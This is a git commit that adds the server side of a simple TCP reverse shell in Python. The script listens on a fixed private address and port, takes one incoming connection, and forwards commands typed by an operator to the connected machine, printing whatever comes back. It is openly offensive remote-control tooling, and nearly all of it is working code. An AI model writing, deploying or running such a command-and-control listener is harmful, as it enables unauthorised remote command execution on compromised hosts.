901542c0fa9ca1dde1df185c238b399e3b266ba6
Ex <sirawit0676@gmail.com>
2018-02-05 11:59:44 +0700

    Added Server side

---
+++ TCP_Reverse_shell/server_side/server.py
@@ -0,0 +1,25 @@
+import socket
+
+def con():
+    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    soc.bind(("192.168.1.101",8080))
+    soc.listen(1)
+    conn,addr = soc.accept()
+    print ('Got Connect From :'), addr
+
+    while True:
+        command = input("CMD >> ")
+
+        if 'terminate' in command:
+            conn.send('terminate')
+            conn.close() #cloase connect with Host
+            break
+        
+        
+        else:
+            conn.send(command)
+            print (conn.recv(1024))
+
+def main():
+    con()
+main()
